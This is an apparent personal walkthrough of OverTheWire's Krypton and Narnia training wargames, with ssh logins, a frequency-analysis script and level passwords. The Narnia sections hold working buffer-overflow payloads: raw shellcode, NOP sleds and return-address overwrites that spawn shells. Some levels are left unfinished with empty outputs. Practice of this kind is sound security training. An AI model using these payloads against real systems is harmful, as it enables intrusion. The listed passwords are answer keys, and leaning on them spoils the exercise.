Output:
```bash
CAESARISEASY
```
**Password: CAESARISEASY**

## Level 3
CMD:
```bash
ssh krypton3@krypton.labs.overthewire.org -p 2231
```
Passowrd:
```bash
CAESARISEASY
```
Solution:
```bash
cd /krypton/krypton3
ls
cat found1
cat found2
cat found3
cat HINT1
cat HINT2
cat krypton4
cat README
temp_dir=$(mktemp -d)
cd $temp_dir
cat /krypton/krypton3/found1 /krypton/krypton3/found2 /krypton/krypton3/found3 > combined.txt
nano frequency_analysis.py
```
```python3
from collections import Counter

# Read combined text
with open("combined.txt", "r") as f:
    ciphertext = f.read().replace(" ", "").replace("\n", "")

# Count letter frequencies
letter_freq = Counter(ciphertext)

# Sort by frequency
sorted_freq = letter_freq.most_common()

# Print results
print("Letter Frequency Analysis:")
for letter, freq in sorted_freq:
    print(f"{letter}: {freq}")
```
```bash
python3 frequency_analysis.py
cat /krypton/krypton3/krypton4 | tr 'SQJUBNGCDZVWMYTXKELAFIORHP' 'ETAOINSRHDLUCMFYWGPBVKXQJZ'
```
Output:
```bash

```
**Password: BRUTE**

## Level 4
CMD:
```bash
ssh krypton4@krypton.labs.overthewire.org -p 2231
```
Passowrd:
```bash
BRUTE
```
Solution:
```bash
cd /krypton/krypton4
ls

```
```python3

```
```bash

```
Output:
```bash

```
**Password: **


# Narnia
## Level 0
CMD:
```bash
ssh narnia0@narnia.labs.overthewire.org -p 2226
```
Passowrd:
```bash
narnia0
```
Solution:
```bash
cd /narnia
ls
./narnia0
```
```bash
A
```
```bash
cat narnia0.c
(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde")'; cat) | ./narnia0
```
Now Your on the Terminal of narnia1
```bash
whoami
cat /etc/narnia_pass/narnia1
```
Output:
```bash
WDcYUTG5ul
```
**Password: WDcYUTG5ul**

## Level 1
CMD:
```bash
ssh narnia1@narnia.labs.overthewire.org -p 2226
```
Passowrd:
```bash
WDcYUTG5ul
```
Solution:
```bash
cd /narnia
ls
./narnia1
cat narnia1.c
```
Refer: https://shell-storm.org/shellcode/files/shellcode-607.html
```bash
export EGG=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*100 + b"\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80")')
export EGG=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81")')
echo $EGG
./narnia1
```
```bash
whoami
cat /etc/narnia_pass/narnia2
```
Output:
```bash
5agRAXeBdG
```
**Password: 5agRAXeBdG**

## Level 2
CMD:
```bash
ssh narnia2@narnia.labs.overthewire.org -p 2226
```
Passowrd:
```bash
5agRAXeBdG
```
Solution:
```bash
cd /narnia
ls
./narnia2
cat narnia2.c
./narnia2 "$(python3 -c 'import sys; sys.stdout.buffer.write(
    b"\x90" * 100 +  # NOP sled
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"  # Shellcode
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b"
    b"\xcd\x80\x31\xc0\x40\xcd\x80" +
    b"A" * (132 - 100 - 28) +  # Padding
    b"\x10\xd2\xff\xff"  # Return address near ESP (adjust if needed)
)')"
```
Output:
```bash

```
**Password: **